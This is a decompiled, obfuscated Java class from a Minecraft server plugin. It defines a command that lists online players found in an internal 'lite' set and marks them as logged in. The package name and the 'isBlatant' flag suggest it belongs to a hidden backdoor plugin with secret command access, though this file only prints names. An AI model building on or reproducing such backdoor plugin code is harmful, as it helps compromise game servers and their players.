/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class ListloggedinCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return false;
    }

    public ListloggedinCommand() {
        ListloggedinCommand llllllllllllllllIlIllIIlIIllIIIl;
    }

    @Override
    public void execute(Core llllllllllllllllIlIllIIlIIlIIlIl, String llllllllllllllllIlIllIIlIIlIlIII, String[] llllllllllllllllIlIllIIlIIlIIlll, Player llllllllllllllllIlIllIIlIIlIIllI) {
        for (Player llllllllllllllllIlIllIIlIIlIlIll : Bukkit.getOnlinePlayers()) {
            if (!llllllllllllllllIlIllIIlIIlIIlIl.lite.contains(llllllllllllllllIlIllIIlIIlIlIll.getName())) continue;
            llllllllllllllllIlIllIIlIIlIIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(llllllllllllllllIlIllIIlIIlIlIll.getName()).append(" | Logged"))));
        }
    }
}

